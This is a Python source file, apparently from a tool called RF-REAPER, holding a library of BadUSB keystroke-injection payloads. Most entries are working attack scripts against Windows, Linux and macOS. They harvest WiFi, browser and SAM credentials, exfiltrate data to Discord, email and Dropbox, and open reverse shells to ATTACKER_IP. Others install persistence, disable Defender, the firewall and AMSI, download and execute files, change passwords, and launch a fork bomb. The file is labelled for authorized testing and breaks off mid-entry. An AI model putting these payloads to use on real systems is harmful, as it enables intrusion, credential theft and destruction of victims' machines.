"""
⚡ RF-REAPER PAYLOAD LIBRARY v2.0
Curated from 15+ open-source repositories:
- I-Am-Jakoby/Flipper-Zero-BadUSB
- aleff-github/my-flipper-shits
- SeenKid/flipper-zero-bad-usb
- narstybits/MacOS-DuckyScripts
- bst04/payloads_flipperZero
- Mr-Proxy-source/BadUSB-Payloads
- FLOCK4H/NeoDucky
- Zenin0/Glipper_Scripts
- I-Am-Jakoby/PowerShell-for-Hackers
- InfoSecREDD/BadPS
- agentzex/FlipperZero-BadUSB-Wireshark
- ADolbyB/flipper-zero-files
- Nikorasu-07/ds-scripts-USB-Army-Knife
- snovvcrash/usbrip
- usb-tools/USBProxy-legacy

EDUCATIONAL/AUTHORIZED TESTING ONLY
"""

PAYLOAD_LIBRARY = {
    # ═══════════════════════════════════════════════════════════
    # RECON — System Information Gathering
    # ═══════════════════════════════════════════════════════════
    "recon": {
        "name": "🔍 Reconnaissance",
        "description": "System enumeration and information gathering",
        "payloads": {
            # Based on I-Am-Jakoby/Flipper-Zero-BadUSB Recon scripts
            "sysinfo_windows": {
                "name": "Windows System Info",
                "os": "windows",
                "description": "Gathers hostname, IP, OS version, users, installed software",
                "source": "Jakoby + aleff-github",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h
ENTER
DELAY 500
STRING $o=[pscustomobject]@{Hostname=$env:COMPUTERNAME;User=$env:USERNAME;IP=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -ne 'Loopback'}).IPAddress -join ',';OS=(Get-WmiObject Win32_OperatingSystem).Caption;Arch=$env:PROCESSOR_ARCHITECTURE;Domain=$env:USERDOMAIN;Drives=(Get-PSDrive -PSProvider FileSystem | Select Name,Used,Free | ConvertTo-Json -Compress);Uptime=(Get-CimInstance Win32_OperatingSystem).LastBootUpTime}; $o | ConvertTo-Json | Out-File $env:TEMP\\si.json
ENTER
DELAY 200"""
            },
            "sysinfo_macos": {
                "name": "macOS System Info",
                "os": "macos",
                "description": "Gathers Mac system information",
                "source": "narstybits/MacOS-DuckyScripts",
                "script": """DELAY 500
GUI SPACE
DELAY 300
STRING Terminal
DELAY 300
ENTER
DELAY 500
STRING system_profiler SPHardwareDataType SPSoftwareDataType SPNetworkDataType > /tmp/sysinfo.txt 2>&1 &
ENTER
DELAY 200"""
            },
            "sysinfo_linux": {
                "name": "Linux System Info",
                "os": "linux",
                "description": "Gathers Linux system details",
                "source": "Community",
                "script": """DELAY 500
CTRL ALT t
DELAY 500
STRING (uname -a; id; hostname; ip a; cat /etc/os-release; df -h; free -h; ps aux) > /tmp/.si 2>&1 &
ENTER
DELAY 200"""
            },
            # Based on Jakoby's network recon
            "network_recon": {
                "name": "Network Discovery",
                "os": "windows",
                "description": "Maps local network, ARP table, open ports, WiFi profiles",
                "source": "Jakoby/PowerShell-for-Hackers",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h
ENTER
DELAY 500
STRING $n=@{ARP=arp -a;Routes=route print;DNS=Get-DnsClientServerAddress|Select InterfaceAlias,ServerAddresses|ConvertTo-Json -Compress;WiFi=(netsh wlan show profiles)|Select-String 'All User'|ForEach{($_ -split ':')[1].Trim()};Connections=Get-NetTCPConnection -State Established|Select LocalAddress,LocalPort,RemoteAddress,RemotePort|ConvertTo-Json -Compress}; $n|ConvertTo-Json|Out-File $env:TEMP\\net.json
ENTER
DELAY 200"""
            },
            "wifi_dump": {
                "name": "WiFi Password Dump",
                "os": "windows",
                "description": "Extracts saved WiFi SSIDs and passwords",
                "source": "Jakoby + SeenKid + aleff-github",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h
ENTER
DELAY 500
STRING (netsh wlan show profiles)|Select-String 'All User'|ForEach{$n=($_ -split ':')[1].Trim();$p=((netsh wlan show profile name=$n key=clear)|Select-String 'Key Content'|ForEach{($_ -split ':')[1].Trim()});[pscustomobject]@{SSID=$n;Password=$p}}|ConvertTo-Json|Out-File $env:TEMP\\wifi.json
ENTER
DELAY 200"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # EXFILTRATION — Data extraction
    # ═══════════════════════════════════════════════════════════
    "exfiltration": {
        "name": "📤 Exfiltration",
        "description": "Data extraction via various channels",
        "payloads": {
            # Based on Jakoby's exfiltration via Discord webhook
            "discord_exfil": {
                "name": "Discord Webhook Exfil",
                "os": "windows",
                "description": "Sends system info to a Discord webhook",
                "source": "Jakoby/Flipper-Zero-BadUSB",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -ep bypass
ENTER
DELAY 500
STRING $dc='WEBHOOK_URL_HERE';$body=@{content="``````$(hostname): $(whoami) | $((Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ', ')``````"}|ConvertTo-Json;Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json'
ENTER
DELAY 200"""
            },
            # Based on aleff-github email exfil
            "email_exfil": {
                "name": "Email Exfil (SMTP)",
                "os": "windows",
                "description": "Sends data via email",
                "source": "aleff-github/my-flipper-shits",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -ep bypass
ENTER
DELAY 500
STRING $smtp='smtp.gmail.com';$port=587;$from='EMAIL';$pass='PASS';$to='DEST';$subj="Exfil-$env:COMPUTERNAME";$body=Get-Content $env:TEMP\\si.json -Raw;$msg=New-Object Net.Mail.MailMessage($from,$to,$subj,$body);$client=New-Object Net.Mail.SmtpClient($smtp,$port);$client.EnableSsl=$true;$client.Credentials=New-Object Net.NetworkCredential($from,$pass);$client.Send($msg)
ENTER
DELAY 200"""
            },
            "dropbox_exfil": {
                "name": "Dropbox Upload Exfil",
                "os": "windows",
                "description": "Uploads files to Dropbox via API",
                "source": "Community payloads",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -ep bypass
ENTER
DELAY 500
STRING $token='DROPBOX_TOKEN';$file="$env:TEMP\\si.json";$content=[IO.File]::ReadAllBytes($file);$headers=@{Authorization="Bearer $token";'Content-Type'='application/octet-stream';'Dropbox-API-Arg'='{\"path\":\"/exfil/'+$env:COMPUTERNAME+'.json\",\"mode\":\"overwrite\"}'};Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Method Post -Headers $headers -Body $content
ENTER
DELAY 200"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # CREDENTIALS — Password & Token Harvesting
    # ═══════════════════════════════════════════════════════════
    "credentials": {
        "name": "🔑 Credentials",
        "description": "Password and token extraction",
        "payloads": {
            # Based on Jakoby's browser credential extraction
            "browser_creds": {
                "name": "Browser Saved Passwords",
                "os": "windows",
                "description": "Extracts saved Chrome/Edge passwords (requires admin)",
                "source": "Jakoby/PowerShell-for-Hackers",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -ep bypass
ENTER
DELAY 500
STRING Add-Type -AssemblyName System.Security;$db="$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data";$tmp="$env:TEMP\\ld";Copy-Item $db $tmp -Force;$conn=New-Object Data.SQLite.SQLiteConnection("Data Source=$tmp");$conn.Open();$cmd=$conn.CreateCommand();$cmd.CommandText='SELECT origin_url,username_value,password_value FROM logins';$r=$cmd.ExecuteReader();while($r.Read()){$url=$r.GetString(0);$user=$r.GetString(1);$pass=[Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect([byte[]]$r.GetValue(2),$null,'CurrentUser'));Write-Output "$url | $user | $pass"}|Out-File $env:TEMP\\bp.txt;$conn.Close()
ENTER
DELAY 200"""
            },
            "sam_dump": {
                "name": "SAM Hash Dump",
                "os": "windows",
                "description": "Dumps SAM hashes (requires elevation)",
                "source": "InfoSecREDD/BadPS",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w h -ep bypass -c reg save HKLM\\SAM $env:TEMP\\sam; reg save HKLM\\SYSTEM $env:TEMP\\sys'
ENTER
DELAY 500
ALT y
DELAY 200"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # PERSISTENCE — Maintaining Access
    # ═══════════════════════════════════════════════════════════
    "persistence": {
        "name": "🔄 Persistence",
        "description": "Maintaining access across reboots",
        "payloads": {
            # Based on Jakoby's persistence methods
            "registry_run": {
                "name": "Registry Run Key",
                "os": "windows",
                "description": "Adds payload to HKCU Run key",
                "source": "Jakoby + aleff-github",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -ep bypass
ENTER
DELAY 500
STRING $payload='C:\\Windows\\Temp\\update.ps1';$cmd='powershell -w h -ep bypass -f '+$payload;New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value $cmd -PropertyType String -Force
ENTER
DELAY 200"""
            },
            "scheduled_task": {
                "name": "Scheduled Task",
                "os": "windows",
                "description": "Creates a persistent scheduled task",
                "source": "Community payloads",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -ep bypass
ENTER
DELAY 500
STRING $action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w h -ep bypass -f C:\\Windows\\Temp\\task.ps1';$trigger=New-ScheduledTaskTrigger -AtLogOn;$settings=New-ScheduledTaskSettingsSet -Hidden;Register-ScheduledTask -TaskName 'SystemHealthCheck' -Action $action -Trigger $trigger -Settings $settings -Force
ENTER
DELAY 200"""
            },
            "startup_folder": {
                "name": "Startup Folder Drop",
                "os": "windows",
                "description": "Drops script in startup folder",
                "source": "SeenKid/flipper-zero-bad-usb",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h
ENTER
DELAY 500
STRING Copy-Item $env:TEMP\\payload.ps1 "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs" -Force
ENTER
DELAY 200"""
            },
            "cronjob_linux": {
                "name": "Cron Job Persistence",
                "os": "linux",
                "description": "Adds persistent cron job",
                "source": "Community",
                "script": """DELAY 500
CTRL ALT t
DELAY 500
STRING (crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.task 2>/dev/null') | crontab -
ENTER
DELAY 200"""
            },
            "launchagent_macos": {
                "name": "LaunchAgent Persistence",
                "os": "macos",
                "description": "Creates a persistent LaunchAgent on macOS",
                "source": "narstybits/MacOS-DuckyScripts",
                "script": """DELAY 500
GUI SPACE
DELAY 300
STRING Terminal
DELAY 300
ENTER
DELAY 500
STRING mkdir -p ~/Library/LaunchAgents && cat > ~/Library/LaunchAgents/com.system.update.plist << 'EOF'
ENTER
STRING <?xml version="1.0" encoding="UTF-8"?>
ENTER
STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
ENTER
STRING <plist version="1.0"><dict><key>Label</key><string>com.system.update</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>/tmp/.task</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>
ENTER
STRING EOF
ENTER
DELAY 200"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # REVERSE SHELLS — Remote Access
    # ═══════════════════════════════════════════════════════════
    "reverse_shells": {
        "name": "🐚 Reverse Shells",
        "description": "Remote access establishment",
        "payloads": {
            "powershell_revshell": {
                "name": "PowerShell Reverse Shell",
                "os": "windows",
                "description": "Classic PS TCP reverse shell",
                "source": "Jakoby + Mr-Proxy-source",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -nop -ep bypass
ENTER
DELAY 500
STRING $c=New-Object Net.Sockets.TcpClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()
ENTER
DELAY 200"""
            },
            "bash_revshell": {
                "name": "Bash Reverse Shell",
                "os": "linux",
                "description": "Bash /dev/tcp reverse shell",
                "source": "Community",
                "script": """DELAY 500
CTRL ALT t
DELAY 500
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
ENTER
DELAY 200"""
            },
            "python_revshell": {
                "name": "Python Reverse Shell",
                "os": "linux",
                "description": "Python-based cross-platform reverse shell",
                "source": "Community",
                "script": """DELAY 500
CTRL ALT t
DELAY 500
STRING python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' &
ENTER
DELAY 200"""
            },
            "macos_revshell": {
                "name": "macOS Reverse Shell",
                "os": "macos",
                "description": "macOS-specific reverse shell via Terminal",
                "source": "narstybits/MacOS-DuckyScripts",
                "script": """DELAY 500
GUI SPACE
DELAY 300
STRING Terminal
DELAY 300
ENTER
DELAY 500
STRING bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &
ENTER
DELAY 200
GUI q"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # PRANKS — Harmless fun
    # ═══════════════════════════════════════════════════════════
    "pranks": {
        "name": "🎭 Pranks",
        "description": "Harmless pranks and demonstrations",
        "payloads": {
            "rickroll": {
                "name": "Rickroll",
                "os": "windows",
                "description": "Opens Rick Astley — Never Gonna Give You Up",
                "source": "Universal classic",
                "script": """DELAY 500
GUI r
DELAY 300
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER"""
            },
            "wallpaper_change": {
                "name": "Change Wallpaper",
                "os": "windows",
                "description": "Downloads and sets a new wallpaper",
                "source": "aleff-github + SeenKid",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -ep bypass
ENTER
DELAY 500
STRING $url='IMAGE_URL_HERE';$path="$env:TEMP\\wp.jpg";Invoke-WebRequest $url -OutFile $path;Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport("user32.dll",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int b,string c,int d);}';[W]::SystemParametersInfo(0x0014,0,$path,0x01|0x02)
ENTER
DELAY 200"""
            },
            "fake_update": {
                "name": "Fake Windows Update",
                "os": "windows",
                "description": "Opens fullscreen fake Windows update page",
                "source": "Jakoby/Flipper-Zero-BadUSB",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -ep bypass
ENTER
DELAY 500
STRING Start-Process 'https://fakeupdate.net/win10ue/' -WindowStyle Maximized; Start-Sleep 1; Add-Type '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int s);' -Name W -Namespace N; $h=(Get-Process -Name *chrome*,*edge*,*firefox* | Select -First 1).MainWindowHandle; [N.W]::ShowWindow($h,3)
ENTER
DELAY 200
F11"""
            },
            "flip_screen": {
                "name": "Flip Screen Upside Down",
                "os": "windows",
                "description": "Rotates display 180 degrees",
                "source": "SeenKid + Community",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h
ENTER
DELAY 500
STRING Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class D{[DllImport("user32.dll")]public static extern bool EnumDisplaySettings(string d,int m,ref DEVMODE dm);[DllImport("user32.dll")]public static extern int ChangeDisplaySettingsEx(string d,ref DEVMODE dm,IntPtr h,int f,IntPtr p);[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Ansi)]public struct DEVMODE{[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;public short dmSpecVersion;public short dmDriverVersion;public short dmSize;public short dmDriverExtra;public int dmFields;public int dmPositionX;public int dmPositionY;public int dmDisplayOrientation;public int dmDisplayFixedOutput;public short dmColor;public short dmDuplex;public short dmYResolution;public short dmTTOption;public short dmCollate;[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;public short dmLogPixels;public int dmBitsPerPel;public int dmPelsWidth;public int dmPelsHeight;public int dmDisplayFlags;public int dmDisplayFrequency;public int dmICMMethod;public int dmICMIntent;public int dmMediaType;public int dmDitherType;public int dmReserved1;public int dmReserved2;public int dmPanningWidth;public int dmPanningHeight;}}';$dm=New-Object D+DEVMODE;$dm.dmSize=[Runtime.InteropServices.Marshal]::SizeOf($dm);[D]::EnumDisplaySettings($null,-1,[ref]$dm);$dm.dmDisplayOrientation=2;[D]::ChangeDisplaySettingsEx($null,[ref]$dm,[IntPtr]::Zero,0,[IntPtr]::Zero)
ENTER
DELAY 200"""
            },
            "say_message_mac": {
                "name": "macOS Text-to-Speech",
                "os": "macos",
                "description": "Makes Mac speak a message out loud",
                "source": "narstybits/MacOS-DuckyScripts",
                "script": """DELAY 500
GUI SPACE
DELAY 300
STRING Terminal
DELAY 300
ENTER
DELAY 500
STRING say -v Samantha "I have gained access to your system. Just kidding, this is a security test."
ENTER
DELAY 200
GUI q"""
            },
            "notepad_msg": {
                "name": "Notepad Warning Message",
                "os": "windows",
                "description": "Opens Notepad with security warning",
                "source": "Mr-Proxy-source + bst04",
                "script": """DELAY 500
GUI r
DELAY 300
STRING notepad
ENTER
DELAY 500
STRING ========================================
ENTER
STRING    RF-REAPER SECURITY TEST
ENTER
STRING ========================================
ENTER
ENTER
STRING This machine is VULNERABLE to wireless
ENTER
STRING keyboard injection attacks.
ENTER
ENTER
STRING Your wireless keyboard traffic can be:
ENTER
STRING   - Intercepted (keylogging)
ENTER
STRING   - Hijacked (keystroke injection)
ENTER
STRING   - Spoofed (fake keystrokes)
ENTER
ENTER
STRING RECOMMENDATIONS:
ENTER
STRING   1. Use wired keyboards for sensitive work
ENTER
STRING   2. Enable AES encryption on wireless keyboards
ENTER
STRING   3. Keep firmware updated
ENTER
STRING   4. Monitor for rogue USB devices
ENTER
ENTER
STRING Test performed by RF-REAPER v2.0
ENTER
STRING $3 hardware. $0 software. Infinite possibilities.
ENTER"""
            },
            "infinite_popups": {
                "name": "Popup Message Loop",
                "os": "windows",
                "description": "Shows persistent popup messages",
                "source": "Glipper_Scripts + SeenKid",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h
ENTER
DELAY 500
STRING while($true){[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[System.Windows.Forms.MessageBox]::Show('Your keyboard is compromised! This is a security test.','RF-REAPER','OK','Warning');Start-Sleep 3}
ENTER
DELAY 200"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # DISABLE DEFENSES — Security bypass
    # ═══════════════════════════════════════════════════════════
    "defense_evasion": {
        "name": "🛡️ Defense Evasion",
        "description": "Disable security controls (requires admin)",
        "payloads": {
            "disable_defender": {
                "name": "Disable Windows Defender",
                "os": "windows",
                "description": "Disables real-time protection",
                "source": "Jakoby + Mr-Proxy-source + aleff-github",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w h -ep bypass -c Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; Add-MpPreference -ExclusionPath C:\\'
ENTER
DELAY 500
ALT y
DELAY 200"""
            },
            "disable_firewall": {
                "name": "Disable Windows Firewall",
                "os": "windows",
                "description": "Disables all firewall profiles",
                "source": "InfoSecREDD/BadPS",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w h -c Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
ENTER
DELAY 500
ALT y
DELAY 200"""
            },
            "disable_amsi": {
                "name": "AMSI Bypass",
                "os": "windows",
                "description": "Bypasses AntiMalware Scan Interface",
                "source": "PowerShell-for-Hackers + BadPS",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h
ENTER
DELAY 500
STRING [Ref].Assembly.GetType('System.Management.Automation.'+$([char]65)+$([char]109)+$([char]115)+$([char]105)+'Utils').GetField($([char]97)+$([char]109)+$([char]115)+$([char]105)+'InitFailed','NonPublic,Static').SetValue($null,$true)
ENTER
DELAY 200"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # LOCKOUT — Denial of Service
    # ═══════════════════════════════════════════════════════════
    "lockout": {
        "name": "🔒 Lockout/DoS",
        "description": "System lockout and denial of service",
        "payloads": {
            "lock_workstation": {
                "name": "Lock Workstation",
                "os": "windows",
                "description": "Immediately locks the workstation",
                "source": "Universal",
                "script": """GUI l"""
            },
            "change_password": {
                "name": "Change User Password",
                "os": "windows",
                "description": "Changes current user password (requires admin)",
                "source": "Jakoby + aleff-github",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell Start-Process cmd -Verb runAs -ArgumentList '/c net user %USERNAME% NewP@ssw0rd!'
ENTER
DELAY 500
ALT y
DELAY 200"""
            },
            "shutdown": {
                "name": "Shutdown System",
                "os": "windows",
                "description": "Initiates immediate shutdown",
                "source": "Community",
                "script": """DELAY 500
GUI r
DELAY 300
STRING shutdown /s /t 0 /f
ENTER"""
            },
            "fork_bomb_linux": {
                "name": "Fork Bomb (Linux)",
                "os": "linux",
                "description": "Classic Bash fork bomb (WARNING: crashes system)",
                "source": "Community",
                "script": """DELAY 500
CTRL ALT t
DELAY 500
STRING :(){ :|:& };:
ENTER"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # USB FORENSICS — Based on usbrip
    # ═══════════════════════════════════════════════════════════
    "forensics": {
        "name": "🔬 USB Forensics",
        "description": "USB event tracking and forensics (based on usbrip)",
        "payloads": {
            "usb_history_windows": {
                "name": "USB Device History",
                "os": "windows",
                "description": "Extracts complete USB device connection history",
                "source": "usbrip concepts adapted for PS",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h -ep bypass
ENTER
DELAY 500
STRING Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\*\\*' | Select PSChildName,FriendlyName,DeviceDesc,Mfg,Service,@{N='FirstInstall';E={(Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\$($_.PSParentPath.Split('\\')[-1])\\$($_.PSChildName)" -Name FirstInstallDate -EA SilentlyContinue).FirstInstallDate}} | ConvertTo-Json | Out-File $env:TEMP\\usb_history.json
ENTER
DELAY 200"""
            },
            "usb_history_linux": {
                "name": "USB History (Linux)",
                "os": "linux",
                "description": "Extracts USB events from system logs (usbrip technique)",
                "source": "snovvcrash/usbrip",
                "script": """DELAY 500
CTRL ALT t
DELAY 500
STRING grep -iE 'usb' /var/log/syslog /var/log/kern.log /var/log/auth.log 2>/dev/null | grep -iE 'new|disconnect|product|manufacturer|serial' | tail -100 > /tmp/usb_forensics.txt 2>&1
ENTER
DELAY 200"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # WIRESHARK — Based on FlipperZero-BadUSB-Wireshark
    # ═══════════════════════════════════════════════════════════
    "wireshark": {
        "name": "🦈 Wireshark Capture",
        "description": "Network capture automation (based on FlipperZero-BadUSB-Wireshark)",
        "payloads": {
            "wireshark_capture": {
                "name": "Auto-Start Wireshark Capture",
                "os": "windows",
                "description": "Launches Wireshark capture silently",
                "source": "agentzex/FlipperZero-BadUSB-Wireshark",
                "script": """DELAY 500
GUI r
DELAY 300
STRING powershell -w h
ENTER
DELAY 500
STRING $ws=Get-ChildItem 'C:\\Program Files\\Wireshark\\tshark.exe','C:\\Program Files (x86)\\Wireshark\\tshark.exe' -EA SilentlyContinue | Select -First 1;if($ws){Start-Process $ws.FullName -ArgumentList '-i 1 -a duration:60 -w $env:TEMP\\capture.pcap' -WindowStyle Hidden}
ENTER
DELAY 200"""
            },
            "tcpdump_capture": {
                "name": "tcpdump Silent Capture",
                "os": "linux",
                "description": "Starts tcpdump network capture",
                "source": "Community + Wireshark concepts",
                "script": """DELAY 500
CTRL ALT t
DELAY 500
STRING sudo tcpdump -i any -c 1000 -w /tmp/.cap.pcap 2>/dev/null &
ENTER
DELAY 200"""
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # RAPID — Speed payloads (< 3 seconds execution)
    # ═══════════════════════════════════════════════════════════
    "rapid": {
        "name": "⚡ Rapid Fire",
        "description": "Ultra-fast payloads that execute in under 3 seconds",
        "payloads": {
            "quick_lock": {
                "name": "Quick Lock",
                "os": "windows",
                "description": "Lock workstation instantly",
                "source": "Universal",
                "script": """GUI l"""
            },
            "quick_screenshot": {
                "name": "Quick Screenshot",
                "os": "windows",
                "description": "Takes screenshot and saves to temp",
                "source": "Jakoby",
                "script": """DELAY 200
GUI r
DELAY 200
STRING powershell -w h -c Add-Type -A System.Windows.Forms;[Windows.Forms.Screen]::PrimaryScreen|ForEach{$b=New-Object Drawing.Bitmap($_.Bounds.Width,$_.Bounds.Height);$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($_.Bounds.Location,[Drawing.Point]::Empty,$_.Bounds.Size);$b.Save("$env:TEMP\\ss.png")}
ENTER"""
            },
            "quick_download": {
                "name": "Quick Download & Execute",
                "os": "windows",
                "description": "Downloads and runs a file",
                "source": "Community",
                "script": "DELAY 200\nGUI r\nDELAY 200\nSTRING powershell -w h iwr 'URL_HERE' -o $env:TEMP\\\\r.exe; Start-Process $env:TEMP\\\\r.exe\nENTER"
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # GHOST AUDIT — Stealth recon (5-8 sec) from Ghost-Audit
    # ═══════════════════════════════════════════════════════════
    "ghost_audit": {
        "name": "👻 Ghost Audit",
        "description": "Ultra-fast stealth recon (5-8 seconds) based on Ghost-Audit",
        "payloads": {
            "stealth_recon_5sec": {
                "name": "Stealth Recon (5 sec)",
                "os": "windows",
                "description": "Grabs IP, ARP, WiFi passwords, network config in 5 seconds",
                "source": "zer0dayf/Ghost-Audit",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h -ep bypass\nENTER\nDELAY 300\nSTRING $d=@{};$d.ip=(Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback'}|Select IPAddress,InterfaceAlias|ConvertTo-Json -Compress);$d.arp=(arp -a);$d.wifi=@();(netsh wlan show profiles)|Select-String 'All User'|%{$n=($_ -split ':')[1].Trim();$k=((netsh wlan show profile name=$n key=clear)|Select-String 'Key Content'|%{($_ -split ':')[1].Trim()});$d.wifi+=\"$n`:$k\"};$d.hostname=$env:COMPUTERNAME;$d.user=$env:USERNAME;$d|ConvertTo-Json|Out-File $env:TEMP\\\\g.json\nENTER"
            },
            "deep_forensic_30sec": {
                "name": "Deep Forensic (30 sec)",
                "os": "windows",
                "description": "Full system forensics: registry, software, USB history, processes",
                "source": "zer0dayf/Ghost-Audit",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h -ep bypass\nENTER\nDELAY 300\nSTRING $r=@{};$r.os=(Get-WmiObject Win32_OperatingSystem|Select Caption,Version|ConvertTo-Json -Compress);$r.cpu=(Get-WmiObject Win32_Processor|Select Name|ConvertTo-Json -Compress);$r.ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2);$r.software=(Get-ItemProperty HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*|Select DisplayName,DisplayVersion|ConvertTo-Json -Compress);$r.usb=(Get-ItemProperty 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Enum\\\\USB\\\\*\\\\*'|Select FriendlyName|ConvertTo-Json -Compress);$r.processes=(Get-Process|Select ProcessName,Id|ConvertTo-Json -Compress);$r|ConvertTo-Json|Out-File $env:TEMP\\\\deep.json\nENTER"
            },
            "stealth_recon_mac": {
                "name": "macOS Ghost Recon",
                "os": "macos",
                "description": "Fast macOS system + network recon with history evasion",
                "source": "Ghost-Audit + narstybits",
                "script": "DELAY 500\nID 05ac:021e Apple:Keyboard\nGUI SPACE\nDELAY 300\nSTRING Terminal\nENTER\nDELAY 500\nSTRING  export HISTSIZE=0\nENTER\nDELAY 200\nSTRING  (system_profiler SPHardwareDataType SPNetworkDataType; ifconfig) > /tmp/.gr 2>&1\nENTER"
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # WIFI ATTACKS — WiFi-Stealer, NETHERCAP, WIFROG
    # ═══════════════════════════════════════════════════════════
    "wifi": {
        "name": "📶 WiFi Attacks",
        "description": "WiFi credential extraction and wireless attacks",
        "payloads": {
            "wifi_stealer_full": {
                "name": "WiFi Stealer (Full Dump)",
                "os": "windows",
                "description": "Extracts ALL saved WiFi credentials and formats for exfil",
                "source": "Psi505/WiFi-Stealer",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h -ep bypass\nENTER\nDELAY 500\nSTRING $results=@();$profiles=(netsh wlan show profiles)|Select-String 'All User'|ForEach{($_ -split ':')[1].Trim()};foreach($p in $profiles){$key=((netsh wlan show profile name=$p key=clear)|Select-String 'Key Content'|ForEach{($_ -split ':')[1].Trim()});$results+=[pscustomobject]@{SSID=$p;Password=$key}};$results|ConvertTo-Json|Out-File $env:TEMP\\\\wifi_dump.json\nENTER"
            },
            "wifi_deauth_monitor": {
                "name": "WiFi Deauth Monitor",
                "os": "linux",
                "description": "Monitors for deauthentication attacks on local network",
                "source": "NETHERCAP concepts",
                "script": "DELAY 500\nCTRL ALT t\nDELAY 500\nSTRING sudo timeout 60 tcpdump -i wlan0 -e 'type mgt subtype deauth' -c 100 2>/dev/null | tee /tmp/deauth_log.txt &\nENTER"
            },
            "wifi_nearby_scan": {
                "name": "Nearby WiFi Scan",
                "os": "windows",
                "description": "Lists all nearby WiFi networks with signal strength",
                "source": "aenslei/flipperZero-studies",
